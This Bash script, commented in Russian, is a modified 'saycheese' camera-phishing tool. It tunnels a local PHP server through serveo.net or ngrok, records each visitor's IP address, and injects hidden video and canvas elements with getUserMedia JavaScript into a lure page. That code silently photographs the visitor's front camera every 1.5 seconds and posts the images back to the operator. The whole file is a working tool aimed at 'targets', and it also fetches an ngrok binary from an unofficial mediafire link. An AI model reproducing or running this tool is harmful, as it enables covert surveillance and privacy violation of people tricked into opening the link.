#!/bin/bash
# =============================================================================
# СКРИПТ ДЛЯ ПОЛУЧЕНИЯ ДОСТУПА К КАМЕРЕ УСТРОЙСТВА
# Автор: модифицировано из saycheese и Noob Hackers
# Версия: 1.1
# =============================================================================

# Определяем директорию, где находится скрипт
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# Переходим в директорию скрипта
cd "$SCRIPT_DIR"

# Очищаем экран терминала
clear
# Настраиваем хранилище для Termux (если используется Termux)
termux-setup-storage
# Устанавливаем PHP пакет автоматически (флаг -y означает "да" на все вопросы)
pkg install php -y
# Устанавливаем wget пакет для скачивания файлов
pkg install wget -y
# Снова очищаем экран
clear
# Устанавливаем обработчик сигнала (Ctrl+C) - при прерывании вызовется функция stop
trap 'printf "\n";stop' 2

# =============================================================================
# ФУНКЦИЯ: ПОКАЗАТЬ БАННЕР (ЗАГОЛОВОК)
# =============================================================================
banner() {
    # Выводим ASCII арт баннер через pipe в lolcat для цветной раскраски
    echo '

                             __
                         __ /_/\___
                        /__/[]\/__/|o-_
                        |    _     ||   -_  
                        |  ((_))   ||     -_
                        |__________|/
             ___  ____   __   ____   ___   __   _  _ 
            / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
            \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_& v1.1 ' |lolcat
                                                                               
    # Выводим пустую строку
    echo " "
    # Выводим информацию об авторе версии 1.0 (белый цвет текста)
    printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
    # Выводим информацию об авторе версии 1.1 (белый цвет текста)
    printf "          \e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"
    # Выводим пустую строку
    printf "\n"
    # Выводим предупреждение о необходимости включить точку доступа
    echo "      N073:> ПОЖАЛУЙСТА ВКЛЮЧИТЕ ТОЧКУ ДОСТУПА (HOTSPOT)
                   ИНАЧЕ ВЫ НЕ ПОЛУЧИТЕ ССЫЛКУ....!"
}

# =============================================================================
# ФУНКЦИЯ: ОСТАНОВКА ВСЕХ ПРОЦЕССОВ
# =============================================================================
stop() {
    # Проверяем, запущен ли процесс ngrok
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    # Проверяем, запущен ли процесс php
    checkphp=$(ps aux | grep -o "php" | head -n1)
    # Проверяем, запущен ли процесс ssh
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    # Если ngrok запущен, то останавливаем его
    if [[ $checkngrok == *'ngrok'* ]]; then
        # Убиваем процесс ngrok с сигналом -2 (SIGINT)
        pkill -f -2 ngrok > /dev/null 2>&1
        # Дополнительно убиваем все процессы ngrok
        killall -2 ngrok > /dev/null 2>&1
    fi
    # Если php запущен, то останавливаем его
    if [[ $checkphp == *'php'* ]]; then
        # Убиваем все процессы php
        killall -2 php > /dev/null 2>&1
    fi
    # Если ssh запущен, то останавливаем его
    if [[ $checkssh == *'ssh'* ]]; then
        # Убиваем все процессы ssh
        killall -2 ssh > /dev/null 2>&1
    fi
    # Выходим из скрипта с кодом ошибки 1
    exit 1
}

# =============================================================================
# ФУНКЦИЯ: ПРОВЕРКА ЗАВИСИМОСТЕЙ
# =============================================================================
dependencies() {
    # Проверяем наличие команды php в системе
    command -v php > /dev/null 2>&1 || { 
        # Если php не найден, выводим сообщение об ошибке и выходим
        echo >&2 "Требуется php, но он не установлен. Установите его. Прерывание."; 
        exit 1; 
    }
}

# =============================================================================
# ФУНКЦИЯ: ПОЛУЧИТЬ IP АДРЕС
# =============================================================================
catch_ip() {
    # Извлекаем IP адрес из файла ip.txt (ищем строку с "IP:" и берем второе поле)
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    # Устанавливаем разделитель полей на новую строку
    IFS=$'\n'
    # Выводим найденный IP адрес (желтый цвет)
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    # Добавляем содержимое ip.txt в конец файла saved.ip.txt
    cat ip.txt >> saved.ip.txt
}

# =============================================================================
# ФУНКЦИЯ: ПРОВЕРКА НА ОБНАРУЖЕНИЕ ЦЕЛИ
# =============================================================================
checkfound() {
    # Выводим пустую строку
    printf "\n"
    # Выводим сообщение о ожидании подключений (зеленый цвет)
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ожидание целей,\e[0m\e[1;77m Нажмите Ctrl + C для выхода...\e[0m\n"
    # Начинаем бесконечный цикл
    while [ true ]; do
        # Проверяем, существует ли файл ip.txt
        if [[ -e "ip.txt" ]]; then
            # Если файл существует, выводим сообщение об обнаружении цели
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Цель открыла ссылку!\n"
            # Вызываем функцию для получения IP адреса
            catch_ip
            # Удаляем файл ip.txt после обработки
            rm -rf ip.txt
        fi
        # Ждем 0.5 секунды
        sleep 0.5
        # Проверяем, существует ли файл Log.log (означает, что фото получено)
        if [[ -e "Log.log" ]]; then
            # Если файл существует, выводим сообщение о получении фото
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Файл камеры получен!\e[0m\n"
            # Удаляем файл Log.log после обработки
            rm -rf Log.log
        fi
        # Ждем еще 0.5 секунды перед следующей проверкой
        sleep 0.5
    done 
}

# =============================================================================
# ФУНКЦИЯ: ЗАПУСК SERVEO СЕРВЕРА
# =============================================================================
server() {
    # Проверяем наличие команды ssh в системе
    command -v ssh > /dev/null 2>&1 || { 
        # Если ssh не найден, выводим сообщение об ошибке и выходим
        echo >&2 "Требуется ssh, но он не установлен. Установите его. Прерывание."; 
        exit 1; 
    }
    # Выводим сообщение о запуске Serveo (белый цвет с желтым плюсом)
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Запуск Serveo...\e[0m\n"
    # Проверяем, запущен ли процесс php
    if [[ $checkphp == *'php'* ]]; then
        # Если php запущен, останавливаем его перед запуском нового
        killall -2 php > /dev/null 2>&1
    fi
    # Проверяем, нужно ли использовать субдомен
    if [[ $subdomain_resp == true ]]; then
        # Если субдомен нужен, запускаем SSH туннель с субдоменом в фоновом режиме
        # -o StrictHostKeyChecking=no - не спрашивать подтверждение при первом подключении
        # -o ServerAliveInterval=60 - отправлять keepalive каждые 60 секунд
        # -R - проброс портов в обратном направлении (с удаленного сервера на локальный)
        # Результат перенаправляем в файл sendlink
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net > sendlink 2>&1 ' &
        # Ждем 8 секунд для установки соединения
        sleep 8
    else
        # Если субдомен не нужен, запускаем SSH туннель без субдомена
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 ' &
        # Ждем 8 секунд для установки соединения
        sleep 8
    fi
    # Выводим сообщение о запуске PHP сервера (желтый цвет)
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Запуск php сервера... (localhost:3333)\e[0m\n"
    # Освобождаем порт 3333, если он занят
    fuser -k 3333/tcp > /dev/null 2>&1
    # Запускаем PHP встроенный сервер на порту 3333 в фоновом режиме
    php -S localhost:3333 > /dev/null 2>&1 &
    # Ждем 3 секунды для запуска сервера
    sleep 3
    # Извлекаем ссылку Serveo из файла sendlink (ищем паттерн https://...serveo.net)
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    # Выводим полученную ссылку (желтый цвет)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Прямая ссылка:\e[0m\e[1;77m %s\n' $send_link
}

# =============================================================================
# ФУНКЦИЯ: СОЗДАНИЕ PAYLOAD ДЛЯ NGROK
# =============================================================================
payload_ngrok() {
    # Получаем ссылку Ngrok через API (запрос к локальному API ngrok на порту 4040)
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    # Устанавливаем HTML шаблон по умолчанию (можно изменить через переменную окружения)
    HTML_TEMPLATE="${HTML_TEMPLATE:-grabcam.html}"
    # Проверяем, существует ли указанный HTML шаблон
    if [[ ! -f "$HTML_TEMPLATE" ]]; then
        # Если шаблон не найден, выводим предупреждение (желтый цвет)
        printf "\e[1;93m[!] HTML шаблон не найден: $HTML_TEMPLATE\e[0m\n"
        # Сообщаем об использовании шаблона по умолчанию (белый цвет)
        printf "\e[1;77m[+] Используется по умолчанию: grabcam.html\e[0m\n"
        # Устанавливаем шаблон по умолчанию
        HTML_TEMPLATE="grabcam.html"
    else
        # Если файл найден, автоматически дополняем его необходимым кодом
        printf "\e[1;93m[*] Проверка и дополнение HTML файла: $HTML_TEMPLATE\e[0m\n"
        auto_fix_html "$HTML_TEMPLATE"
    fi
    # Заменяем в HTML шаблоне строку 'forwarding_link' на реальную ссылку Ngrok
    # Результат сохраняем в index2.html
    sed 's+forwarding_link+'$link'+g' "$HTML_TEMPLATE" > index2.html
    # Заменяем в PHP шаблоне строку 'forwarding_link' на реальную ссылку Ngrok
    # Результат сохраняем в index.php
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    # Выводим сообщение об использованном шаблоне (зеленый цвет)
    printf "\e[1;92m[+] Использован HTML шаблон: $HTML_TEMPLATE\e[0m\n"
}

# =============================================================================
# ФУНКЦИЯ: ЗАПУСК NGROK СЕРВЕРА
# =============================================================================
ngrok_server() {
    # Проверяем, существует ли исполняемый файл ngrok
    if [[ -e ngrok ]]; then
        # Если ngrok существует, выводим пустую строку (ничего не делаем)
        echo ""
    else
        # Если ngrok не существует, проверяем наличие unzip
        command -v unzip > /dev/null 2>&1 || { 
            # Если unzip не найден, выводим ошибку и выходим
            echo >&2 "Требуется unzip, но он не установлен. Установите его. Прерывание."; 
            exit 1; 
        }
        # Проверяем наличие wget
        command -v wget > /dev/null 2>&1 || { 
            # Если wget не найден, выводим ошибку и выходим
            echo >&2 "Требуется wget, но он не установлен. Установите его. Прерывание."; 
            exit 1; 
        }
        # Выводим сообщение о начале скачивания Ngrok (зеленый цвет)
        printf "\e[1;92m[\e[0m+\e[1;92m] Скачивание Ngrok...\n"
        # Определяем архитектуру системы (ARM или нет)
        arch=$(uname -a | grep -o 'arm' | head -n1)
        # Определяем, является ли система Android
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        # Если система ARM или Android
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            # Скачиваем архив ngrok для ARM/Android
            wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1
            # Проверяем, успешно ли скачан архив
            if [[ -e ngrok+wifi+data.zip ]]; then
                # Распаковываем архив
                unzip ngrok+wifi+data.zip > /dev/null 2>&1
                # Делаем файл ngrok исполняемым
                chmod +x ngrok
                # Удаляем архив после распаковки
                rm -rf ngrok+wifi+data.zip
            else
                # Если скачивание не удалось, выводим ошибку с инструкцией
                printf "\e[1;93m[!] Ошибка скачивания... Termux, выполните:\e[0m\e[1;77m pkg install wget\e[0m\n"
                # Выходим из скрипта
                exit 1
            fi
        else
            # Если система не ARM/Android (обычный Linux)
            # Скачиваем архив ngrok для обычного Linux
            wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1
            # Проверяем наличие неправильного имени файла (старая версия)
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                # Распаковываем архив
                unzip ngrok+wifi+data.zip > /dev/null 2>&1
                # Делаем файл ngrok исполняемым
                chmod +x ngrok
                # Удаляем архив после распаковки
                rm -rf ngrok+wifi+data.zip
            else
                # Если что-то пошло не так, выводим ошибку
                printf "\e[1;93m[!] Ошибка скачивания... \e[0m\n"
                # Выходим из скрипта
                exit 1
            fi
        fi
    fi
    # Выводим сообщение о запуске PHP сервера (зеленый цвет)
    printf "\e[1;92m[\e[0m+\e[1;92m] Запуск php сервера...\n"
    # Запускаем PHP встроенный сервер на порту 3333 в фоновом режиме
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    # Ждем 2 секунды для запуска сервера
    sleep 2
    # Выводим сообщение о запуске Ngrok сервера (зеленый цвет)
    printf "\e[1;92m[\e[0m+\e[1;92m] Запуск ngrok сервера...\n"
    # Запускаем ngrok для проброса порта 3333 в фоновом режиме
    ./ngrok http 3333 > /dev/null 2>&1 &
    # Ждем 10 секунд для установки туннеля
    sleep 10
    # Получаем ссылку Ngrok через API
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    # Выводим полученную ссылку (зеленый цвет)
    printf "\e[1;92m[\e[0m*\e[1;92m] Прямая ссылка:\e[0m\e[1;77m %s\e[0m\n" $link
    # Вызываем функцию создания payload с Ngrok ссылкой
    payload_ngrok
    # Начинаем проверку на обнаружение целей
    checkfound
}

# =============================================================================
# ФУНКЦИЯ: ВЫБОР МЕТОДА ПОРТ-ФОРВАРДИНГА
# =============================================================================
start1() {
    # Если файл sendlink существует, удаляем его (очистка перед новым запуском)
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
    # Выводим пустую строку
    printf "\n"
    # Выводим опцию 1 - Serveo (рекомендуется для России) (зеленый цвет)
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (Рекомендуется для России)\e[0m\n"
    # Выводим опцию 2 - Ngrok (зеленый цвет)
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
    # Устанавливаем опцию по умолчанию (1 - Serveo)
    default_option_server="1"
    # Запрашиваем у пользователя выбор опции (желтый цвет промпта)
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Выберите метод порт-форвардинга [По умолчанию: 1 (Serveo)]: \e[0m' option_server
    # Если пользователь не ввел ничего, используем значение по умолчанию
    option_server="${option_server:-${default_option_server}}"
    # Если выбрана опция 1 (Serveo)
    if [[ $option_server -eq 1 ]]; then
        # Проверяем наличие PHP
        command -v php > /dev/null 2>&1 || { 
            # Если PHP не найден, выводим ошибку и выходим
            echo >&2 "Требуется php, но он не установлен. Установите его. Прерывание."; 
            exit 1; 
        }
        # Вызываем функцию start для настройки Serveo
        start
    # Если выбрана опция 2 (Ngrok)
    elif [[ $option_server -eq 2 ]]; then
        # Вызываем функцию ngrok_server для настройки Ngrok
        ngrok_server
    else
        # Если выбрана неверная опция, выводим сообщение об ошибке (желтый цвет)
        printf "\e[1;93m [!] Неверная опция!\e[0m\n"
        # Ждем 1 секунду
        sleep 1
        # Очищаем экран
        clear
        # Запускаем функцию start1 снова (рекурсивный вызов)
        start1
    fi
}

# =============================================================================
# ФУНКЦИЯ: АВТОМАТИЧЕСКОЕ ДОПОЛНЕНИЕ HTML ФАЙЛА
# =============================================================================
auto_fix_html() {
    local html_file="$1"
    # Проверяем, существует ли файл
    if [[ ! -f "$html_file" ]]; then
        return 1
    fi
    # Создаем временный файл
    local temp_file="${html_file}.tmp"
    # Копируем оригинальный файл во временный
    cp "$html_file" "$temp_file"
    
    # ========================================================================
    # ШАГ 1: Добавляем jQuery ПЕРВЫМ (если его нет)
    # ========================================================================
    if ! grep -q "jquery" "$temp_file" -i && ! grep -q "jquery.js" "$temp_file"; then
        local jquery_file=$(mktemp)
        echo '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>' > "$jquery_file"
        if grep -q "</head>" "$temp_file"; then
            sed -i "/<\/head>/r $jquery_file" "$temp_file"
        elif grep -q "<body>" "$temp_file"; then
            sed -i "/<body>/r $jquery_file" "$temp_file"
        elif grep -q "</body>" "$temp_file"; then
            sed -i "/<\/body>/r $jquery_file" "$temp_file"
        else
            cat "$jquery_file" >> "$temp_file"
        fi
        rm -f "$jquery_file"
    fi
    
    # ========================================================================
    # ШАГ 2: Добавляем элементы video и canvas (если их нет)
    # ========================================================================
    # Проверяем наличие элементов video и canvas
    if ! grep -q '<video' "$temp_file" && ! grep -q 'id="video"' "$temp_file"; then
        # Создаем временный файл с элементами video и canvas
        local video_canvas_file=$(mktemp)
        cat > "$video_canvas_file" << 'ENDOFVIDEO'
<!-- Автоматически добавлено: элементы для камеры -->
<div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
ENDOFVIDEO
        # Находим место для вставки - ВНУТРИ body, но ВНЕ script тегов
        # Ищем последнюю строку перед закрывающим </body>, которая НЕ является частью <script>
        if grep -q "</body>" "$temp_file"; then
            # Используем awk для вставки перед </body>, но только если мы не внутри script
            awk -v insert_file="$video_canvas_file" '
            BEGIN {
                in_script = 0
                inserted = 0
                while ((getline line < insert_file) > 0) {
                    insert_lines = insert_lines line "\n"
                }
                close(insert_file)
            }
            /<script/ { in_script = 1 }
            /<\/script>/ { in_script = 0 }
            /<\/body>/ && !inserted && !in_script {
                print insert_lines
                inserted = 1
            }
            { print }
            ' "$temp_file" > "${temp_file}.new" && mv "${temp_file}.new" "$temp_file"
        elif grep -q "<body>" "$temp_file"; then
            # Если есть открывающий <body>, вставляем после него
            sed -i "/<body>/r $video_canvas_file" "$temp_file"
        else
            # Если нет body, создаем его или добавляем в конец
            if ! grep -q "<html>" "$temp_file"; then
                echo '<body>' >> "$temp_file"
                cat "$video_canvas_file" >> "$temp_file"
                echo '</body>' >> "$temp_file"
            else
                cat "$video_canvas_file" >> "$temp_file"
            fi
        fi
        rm -f "$video_canvas_file"
    elif ! grep -q '<canvas' "$temp_file" && ! grep -q 'id="canvas"' "$temp_file"; then
        # Если video есть, но canvas нет - добавляем только canvas
        local canvas_file=$(mktemp)
        echo '<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>' > "$canvas_file"
        # Вставляем после video элемента, но ВНЕ script тегов
        if grep -q 'id="video"' "$temp_file"; then
            # Находим строку с video и вставляем после нее, но только если она не в script
            awk -v insert_line='<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>' '
            /id="video"/ && !in_script {
                print
                print insert_line
                next
            }
            /<script/ { in_script = 1 }
            /<\/script>/ { in_script = 0 }
            { print }
            ' "$temp_file" > "${temp_file}.new" && mv "${temp_file}.new" "$temp_file"
        elif grep -q "</body>" "$temp_file"; then
            sed -i "/<\/body>/i\\<canvas hidden=\"hidden\" id=\"canvas\" width=\"740\" height=\"580\"></canvas>" "$temp_file"
        fi
        rm -f "$canvas_file"
    fi
    
    # ========================================================================
    # ШАГ 3: Добавляем функцию post() (если её нет или неправильный URL)
    # ========================================================================
    if ! grep -q "forwarding_link/post.php" "$temp_file"; then
        if grep -q "function post" "$temp_file"; then
            # Если функция есть, но URL неправильный - заменяем
            sed -i "s|url:.*post\.php|url: 'forwarding_link/post.php'|g" "$temp_file"
            sed -i "s|url:\s*['\"].*['\"]|url: 'forwarding_link/post.php'|g" "$temp_file"
        else
            # Если функции post нет - добавляем её
            local post_function_file=$(mktemp)
            cat > "$post_function_file" << 'ENDOFFUNCTION'
<!-- Автоматически добавлено: функция отправки данных -->
<script>
function post(imgdata){
    if (typeof $ === 'undefined') {
        console.error('jQuery не загружен!');
        return;
    }
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function(result){
        },
        error: function(){
        }
    });
}
</script>
ENDOFFUNCTION
            # Вставляем перед закрывающим тегом body
            if grep -q "</body>" "$temp_file"; then
                sed -i "/<\/body>/r $post_function_file" "$temp_file"
            elif grep -q "</html>" "$temp_file"; then
                sed -i "/<\/html>/r $post_function_file" "$temp_file"
            else
                cat "$post_function_file" >> "$temp_file"
            fi
            rm -f "$post_function_file"
        fi
    fi
    # ========================================================================
    # ШАГ 4: Добавляем код доступа к камере ПОСЛЕДНИМ (если его нет)
    # ========================================================================
    if ! grep -q "getUserMedia" "$temp_file" && ! grep -q "navigator.mediaDevices" "$temp_file"; then
        local camera_file=$(mktemp)
        cat > "$camera_file" << 'ENDOFCAMERA'
<!-- Автоматически добавлено: код доступа к камере -->
<script>
// Функция для безопасной инициализации камеры с проверками
function waitForElementsAndInit() {
    // Получаем элементы с повторными попытками
    var video = document.getElementById('video');
    var canvas = document.getElementById('canvas');
    
    // Проверяем наличие элементов
    if (!video) {
        console.log('Элемент video не найден, ждем...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    if (!canvas) {
        console.log('Элемент canvas не найден, ждем...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    // Проверяем наличие функции post
    if (typeof post !== 'function') {
        console.log('Функция post() не найдена, ждем...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    // Все элементы найдены, инициализируем камеру
    console.log('Все элементы найдены, запускаем камеру...');
    initCamera(video, canvas);
}

function initCamera(video, canvas) {
    // Дополнительная проверка элементов
    if (!video || !canvas) {
        console.error('Ошибка: элементы video или canvas пустые!');
        return;
    }
    
    const constraints = { 
        audio: false, 
        video: { 
            facingMode: "user" 
        } 
    };
    
    // Запрашиваем доступ к камере
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia(constraints)
            .then(function(stream) {
                handleSuccess(stream, video, canvas);
            })
            .catch(function(error) {
                console.error('Ошибка доступа к камере:', error);
            });
    } else {
        console.error('getUserMedia не поддерживается в этом браузере');
    }
}

function handleSuccess(stream, video, canvas) {
    // Проверяем элементы еще раз перед использованием
    if (!video) {
        console.error('Ошибка: элемент video не найден в handleSuccess!');
        return;
    }
    
    if (!canvas) {
        console.error('Ошибка: элемент canvas не найден в handleSuccess!');
        return;
    }
    
    // Сохраняем поток
    window.stream = stream;
    
    // Устанавливаем поток в video элемент
    try {
        video.srcObject = stream;
    } catch (error) {
        console.error('Ошибка при установке srcObject:', error);
        return;
    }
    
    // Получаем контекст canvas
    var context = canvas.getContext('2d');
    if (!context) {
        console.error('Не удалось получить контекст canvas!');
        return;
    }
    
    // Захватываем кадры каждые 1.5 секунды
    setInterval(function(){
        // Проверяем готовность видео
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            try {
                // Рисуем кадр на canvas
                context.drawImage(video, 0, 0, 740, 580);
                
                // Конвертируем в base64
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                
                // Отправляем на сервер
                if (typeof post === 'function') {
                    post(canvasData);
                } else {
                    console.error('Функция post() не найдена!');
                }
            } catch (error) {
                console.error('Ошибка при захвате кадра:', error);
            }
        }
    }, 1500);
}

// Ждем полной загрузки страницы и всех элементов
(function() {
    var attempts = 0;
    var maxAttempts = 20; // Максимум 10 секунд (20 * 500ms)
    
    function tryInit() {
        attempts++;
        var video = document.getElementById('video');
        var canvas = document.getElementById('canvas');
        
        if (video && canvas && typeof post === 'function') {
            console.log('Все готово, запускаем камеру...');
            waitForElementsAndInit();
        } else if (attempts < maxAttempts) {
            setTimeout(tryInit, 500);
        } else {
            console.error('Превышено время ожидания элементов!');
            console.error('video:', !!video, 'canvas:', !!canvas, 'post:', typeof post);
        }
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(tryInit, 1000);
        });
    } else {
        setTimeout(tryInit, 1000);
    }
})();
</script>
ENDOFCAMERA
        # Вставляем перед закрывающим тегом body или в конец
        if grep -q "</body>" "$temp_file"; then
            sed -i "/<\/body>/r $camera_file" "$temp_file"
        elif grep -q "</html>" "$temp_file"; then
            sed -i "/<\/html>/r $camera_file" "$temp_file"
        else
            cat "$camera_file" >> "$temp_file"
        fi
        rm -f "$camera_file"
    fi
    # Заменяем оригинальный файл временным
    mv "$temp_file" "$html_file"
    # Выводим сообщение об успешном дополнении файла
    printf "\e[1;92m[+] HTML файл автоматически дополнен необходимым кодом: $html_file\e[0m\n"
}

# =============================================================================
# ФУНКЦИЯ: СОЗДАНИЕ PAYLOAD ДЛЯ SERVEO
# =============================================================================
payload() {
    # Извлекаем ссылку Serveo из файла sendlink
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    # Устанавливаем HTML шаблон по умолчанию (можно изменить через переменную окружения)
    HTML_TEMPLATE="${HTML_TEMPLATE:-grabcam.html}"
    # Проверяем, существует ли указанный HTML шаблон
    if [[ ! -f "$HTML_TEMPLATE" ]]; then
        # Если шаблон не найден, выводим предупреждение (желтый цвет)
        printf "\e[1;93m[!] HTML шаблон не найден: $HTML_TEMPLATE\e[0m\n"
        # Сообщаем об использовании шаблона по умолчанию (белый цвет)
        printf "\e[1;77m[+] Используется по умолчанию: grabcam.html\e[0m\n"
        # Устанавливаем шаблон по умолчанию
        HTML_TEMPLATE="grabcam.html"
    else
        # Если файл найден, автоматически дополняем его необходимым кодом
        printf "\e[1;93m[*] Проверка и дополнение HTML файла: $HTML_TEMPLATE\e[0m\n"
        auto_fix_html "$HTML_TEMPLATE"
    fi
    # Заменяем в HTML шаблоне строку 'forwarding_link' на реальную ссылку Serveo
    # Результат сохраняем в index2.html
    sed 's+forwarding_link+'$send_link'+g' "$HTML_TEMPLATE" > index2.html
    # Заменяем в PHP шаблоне строку 'forwarding_link' на реальную ссылку Serveo
    # Результат сохраняем в index.php
    sed 's+forwarding_link+'$send_link'+g' template.php > index.php
    # Выводим сообщение об использованном шаблоне (зеленый цвет)
    printf "\e[1;92m[+] Использован HTML шаблон: $HTML_TEMPLATE\e[0m\n"
    # Выводим подсказку о том, как изменить шаблон (белый цвет)
    printf "\e[1;77m[+] Чтобы изменить HTML шаблон, установите переменную HTML_TEMPLATE\e[0m\n"
}

# =============================================================================
# ФУНКЦИЯ: НАЧАЛО РАБОТЫ С SERVEO
# =============================================================================
start() {
    # Устанавливаем значение по умолчанию для выбора субдомена (Y - да)
    default_choose_sub="Y"
    # Генерируем случайный субдомен по умолчанию (grabcam + случайное число)
    default_subdomain="grabcam$RANDOM"
    # Запрашиваем у пользователя, хочет ли он выбрать субдомен (желтый цвет)
    printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Выбрать субдомен? (По умолчанию:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
    # Считываем ответ пользователя
    read choose_sub
    # Если пользователь не ввел ничего, используем значение по умолчанию
    choose_sub="${choose_sub:-${default_choose_sub}}"
    # Проверяем, хочет ли пользователь использовать субдомен
    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
        # Устанавливаем флаг, что субдомен нужен
        subdomain_resp=true
        # Запрашиваем имя субдомена (желтый цвет, показываем значение по умолчанию)
        printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Субдомен: (По умолчанию:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
        # Считываем имя субдомена от пользователя
        read subdomain
        # Если пользователь не ввел имя, используем сгенерированное по умолчанию
        subdomain="${subdomain:-${default_subdomain}}"
    fi
    # Вызываем функцию запуска Serveo сервера
    server
    # Вызываем функцию создания payload со ссылкой Serveo
    payload
    # Начинаем проверку на обнаружение целей
    checkfound
}

# =============================================================================
# ОСНОВНОЙ КОД ЗАПУСКА СКРИПТА
# =============================================================================
# Устанавливаем имя папки для сохранения фотографий (можно изменить через переменную окружения)
PHOTO_DIR="${PHOTO_DIR:-Photo}"
# Проверяем, существует ли папка для фотографий
if [[ ! -d "$PHOTO_DIR" ]]; then
    # Если папки нет, создаем её (рекурсивно, -p создает все необходимые родительские директории)
    mkdir -p "$PHOTO_DIR"
    # Выводим сообщение о создании папки (зеленый цвет)
    printf "\e[1;92m[+] Создана папка для фотографий: $PHOTO_DIR\e[0m\n"
fi
# Вызываем функцию проверки зависимостей
dependencies
# Вызываем функцию показа баннера (заголовка)
banner
# Вызываем функцию выбора метода порт-форвардинга (начало работы)
start1
